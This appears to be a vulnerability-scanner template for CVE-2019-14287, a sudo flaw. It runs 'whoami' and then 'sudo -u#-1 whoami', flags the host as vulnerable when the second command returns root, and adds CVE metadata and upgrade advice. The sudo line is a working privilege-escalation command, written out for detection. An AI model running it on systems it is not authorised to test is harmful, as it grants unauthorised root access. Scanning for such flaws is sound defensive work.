code:
- engine:
  - sh
  - bash
  source: 'whoami

    '
- engine:
  - sh
  - bash
  matchers:
  - condition: and
    dsl:
    - '!contains(code_1_response, "root")'
    - contains(code_2_response, "root")
    type: dsl
  source: 'sudo -u#-1 whoami

    '
id: CVE-2019-14287
info:
  author: daffainfo
  classification:
    cpe: cpe:2.3:a:sudo_project:sudo:*:*:*:*:*:*:*:*
    cve-id: CVE-2019-14287
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.8
    cwe-id: CWE-755
    epss-percentile: 0.99362
    epss-score: 0.86126
  description: 'In Sudo before 1.8.28, an attacker with access to a Runas ALL sudoer
    account can bypass certain policy blacklists and session PAM modules, and can
    cause incorrect logging, by invoking sudo with a crafted user ID. For example,
    this allows bypass of !root configuration, and USER= logging, for a "sudo -u \#$((0xffffffff))"
    command.

    '
  impact: 'Attackers can bypass privilege restrictions, potentially leading to unauthorized
    privilege escalation and incorrect logging.

    '
  metadata:
    max-request: 2
    product: sudo
    vendor: sudo_project
    verified: true
  name: Sudo <= 1.8.27 - Security Bypass
  reference:
  - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-14287
  - https://www.exploit-db.com/exploits/47502
  - http://lists.opensuse.org/opensuse-security-announce/2019-10/msg00042.html
  - http://lists.opensuse.org/opensuse-security-announce/2019-10/msg00047.html
  - http://packetstormsecurity.com/files/154853/Slackware-Security-Advisory-sudo-Updates.html
  remediation: 'Upgrade Sudo to version 1.8.28 or later that properly handles crafted
    user ID values.

    '
  severity: high
  tags: packetstorm,cve,cve2019,sudo,code,linux,privesc,local,canonical,sudo_project,vuln
self-contained: true
